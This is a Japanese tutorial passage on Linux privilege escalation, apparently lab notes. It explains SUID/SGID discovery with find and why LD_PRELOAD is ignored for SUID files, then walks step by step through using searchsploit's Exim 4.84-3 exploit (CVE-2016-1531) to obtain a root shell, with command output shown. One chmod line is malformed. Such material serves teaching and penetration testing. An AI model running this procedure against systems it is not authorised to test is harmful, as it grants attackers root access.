SUIDまたはSGIDビットが設定されているファイルを探すには、次のfindコマンドを使用します。  
```
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;
2> /dev/null
-rwxr-sr-x 1 root shadow 19528 Feb 15 2011 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 108600 Apr 2 2014 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 37552 Feb 15 2011 /usr/bin/chsh
-rwsr-xr-x 2 root root 168136 Jan 5 2016 /usr/bin/sudo
-rwxr-sr-x 1 root tty 11000 Jun 17 2010 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 35040 Dec 18 2010 /usr/bin/crontab
...
```
LD_PRELOAD と LD_LIBRARY_PATH について簡単に説明します。   
あなたはこう思うかもしれません。   
LD_PRELOAD と LD_LIBRARY_PATH 環境変数のトリックは sudo 権限昇格で使用したのと同じでないのか?   
Linuxでは、明らかにセキュリティリスクがあるため、デフォルトでは無効になっています。セキュリティ上のリスクがあるためです。   
これらの環境変数は、SUID ファイルが実行されたときに無視されます。   
一部のプログラムは、操作を支援するために SUID ファイルをインストールします。   
root として実行されるサービスが脆弱性を持つ可能性があるのと同様に、
ルート シェルを悪用できるので、これらの SUID ファイルも悪用できます。   
エクスプロイトは、Searchsploit、Google、および GitHub を使用して見つけることができます。   
カーネルとサービスのエクスプロイトを見つけるのと同じ方法です。   
# Privilege Escalation
1. ターゲット上のSUID/SGIDファイルを検索します。
```
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;
2> /dev/null
...
-rwsr-xr-x 1 root root 963691 May 13 2017 /usr/sbin/exim-4.84-3
...
```
Eximは人気のあるメール転送エージェントですが、多くのセキュリティ上の脆弱性を持つことでやや悪名高いです。   
2. eximのバージョンはファイル名を見れば一目瞭然なのですが、確認することができます。   
```
$ /usr/sbin/exim-4.84-3 --version
Exim version 4.84 #3 built 13-May-2017 01:45:35
```
3. 私たちのローカルマシンでsearchsploitを使用すると、この正確なバージョンでローカルな特権の昇格が見つかります。
```
# searchsploit exim 4.84
...
Exim 4.84-3 - Local Privilege Escalation |
exploits/linux/local/39535.sh
```
4. エクスプロイト スクリプトをターゲット マシンにコピーします。スクリプトから ^M 文字を削除する必要がある場合があります。
```
$ sed -e "s/^M//" 39535.sh > privesc.sh
```
なお、^Mを出すには、Ctrlを押しながら、VとMを連続して押す必要があります。
5. スクリプトが実行可能であることを確認する
```
$ chmod + privesc.sh
```
6. スクリプトを実行し、root shellを取得する。
```
$ ./privesc.sh
[ CVE-2016-1531 local root exploit
sh-4.1# id
uid=0(root) gid=1000(user) groups=0(root)
```